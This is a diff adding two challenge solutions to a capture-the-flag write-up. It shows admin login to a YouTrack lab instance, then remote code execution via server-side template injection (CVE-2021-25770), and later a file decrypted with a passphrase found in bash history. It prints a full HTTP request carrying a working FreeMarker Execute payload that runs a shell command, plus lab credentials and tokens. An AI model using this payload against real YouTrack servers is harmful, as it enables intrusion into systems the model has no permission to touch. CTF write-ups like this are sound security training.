@@ -404,6 +404,99 @@ We see a password which looks like what a real admin would use haha
 
 So the cred is likely `admin:Th1sIsAV3ryS3cur3Adm1nP4ssw0rd0101#`
 
-Since *Dave* was referring the cred to the *YouTrack* web service let us try logging in as admin using this newly found password
+Since *Dave* was referring to the cred of the *YouTrack* web service let us try logging in as admin using this newly found password
 ![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/eef55085-c232-452e-b9f7-c4baf0339480)
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/03551e1c-dccf-41a4-8732-208906fe3a09)
 
+Cool since we're admin we can further exploit this web app
+
+Remember that we got a [vulnerability](https://www.synacktiv.com/publications/exploiting-cve-2021-25770-a-server-side-template-injection-in-youtrack.html) which took exploited the web app via SSTI 
+
+Following the instruction lead to remote code execution
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5d6db81a-1d45-4399-bea5-af2a96e2b83f)
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/400bccd6-7af0-4237-868d-32ff3b7b803d)
+
+We are user *dave* 
+
+I made it list the files in dave's directory
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/53dbc37f-5d83-4151-b1bf-d62975db0760)
+
+From here we can cat the file
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/bb01b081-190d-4cb0-b7c0-9f7ad44a63b2)
+
+Here's my request
+
+```
+POST /api/admin/notificationSupplement/preview?$top=-1&fields=output,issueId,error HTTP/1.1
+Host: localhost:8000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost:8000/admin/notificationTemplates/article_digest_subject
+Content-Type: application/json;charset=utf-8
+Authorization: Bearer 1683981421136.be561191-dbd3-4457-86f5-592c273d3a82.1e31bb66-596d-41d6-9137-09b74c484055.be561191-dbd3-4457-86f5-592c273d3a82 6ab631e2-61a7-4806-b029-44f0753fc29a 0-0-0-0-0;1.MCwCFEzJ/cvlsEpm0ynQY+gvxuTKdWzzAhQeiLQA+N86lO1dXGbNEVtoBGuacw==
+Content-Length: 421
+Origin: http://localhost:8000
+Connection: close
+Cookie: i_like_gogs=8e9ae9c0377d4e18; i_like_gitea=f8bf16c31150322e; lang=en-US; YTJSESSIONID=node0dmm9xnxqzju510a8uh9375heq13.node0
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+
+{
+  "template": {
+      "fileName": "article_digest_subject.ftl",
+      "content":"<#assign classloader=article.class.protectionDomain.classLoader><#assign owc=classloader.loadClass(\"freemarker.template.ObjectWrapper\")><#assign dwf=owc.getField(\"DEFAULT_WRAPPER\").get(null)><#assign ec=classloader.loadClass(\"freemarker.template.utility.Execute\")>${dwf.newInstance(ec,null)(\"cat /home/dave/flag.txt\")}"
+  }
+}
+```
+
+And here's the flag:
+
+```
+Flag: Hero{pl41nt3xt_p4ssw0rd_4nd_s5t1_b1t_much_41nt_1t?}
+```
+
+#### IMF#4: Put the past behind
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/92b0d5a2-baba-4359-afb8-5a4e9aaf49db)
+
+I got 2nd blood on this challenge also 🩸
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/eece97e9-dbd0-4206-91da-808dcbacca03)
+
+Let us get this over with 🙂
+
+Since we already have code execution on the box let's see if we can get shell
+
+I checked if there was any ssh key for user dave and there wasn't
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/4eb42fd2-0115-4dc2-a1c3-8cb0deb3e842)
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0abec2dc-c8fc-47eb-b015-96203fc21d71)
+
+But I noticed a file *randomfile.txt.enc* and also *.bash_history* in the user dave directory so i copied it to /tmp
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6dc11b31-1c6e-4d0f-9440-a7a72d6a31ee)
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e55f7832-cdad-4b91-ac6b-3495b795f301)
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f75d0b9f-a57a-41aa-9b4f-616350879aad)
+
+Back on the box we can now access the file
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f82cab2c-3bbc-4f5c-b275-743ffc9af0db)
+
+We see that this is the command used to create the *radnomfile.txt.enc*:
+
+```
+openssl aes-256-cbc -salt -k Sup3r53cr3tP4ssw0rd -in randomfile.txt -out randomfile.txt.enc
+```
+
+It's using open ssl aes encryption to decrypt it this is the command:
+
+```
+openssl aes-256-cbc -d -salt -k Sup3r53cr3tP4ssw0rd -in randomfile.txt.enc -out randomfile.txt.dec
+```
+
+Running that decrypts the file and I got the flag
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5a5aa8e5-98a9-4043-9e83-a413fbc3b958)
+
+```
+Flag: Hero{4_l1ttle_h1st0ry_l3ss0n_4_u}
+```
+
+And we're done 🙂
